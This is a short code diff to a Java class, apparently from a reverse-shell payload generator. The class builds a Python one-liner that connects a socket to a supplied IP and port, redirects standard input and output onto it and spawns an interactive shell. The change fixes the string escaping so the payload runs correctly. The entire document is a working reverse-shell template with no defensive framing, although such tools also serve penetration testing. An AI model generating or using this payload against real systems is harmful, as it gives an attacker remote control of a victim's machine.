@@ -8,7 +8,7 @@
 
         public Python_2(String localIP, int localPort, LISTENER listener, SHELLS shellType){
             super(localIP, localPort, listener, shellType);
-            shellFormat = String.format("python -c 'import\n socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"%s\\\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\\\"%s\\\")'",this.getLocalIP() ,this.getLocalPort(), this.getShell() );
+            shellFormat = String.format("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"%s\")'",this.getLocalIP() ,this.getLocalPort(), this.getShell() );
         }
 
         @Override
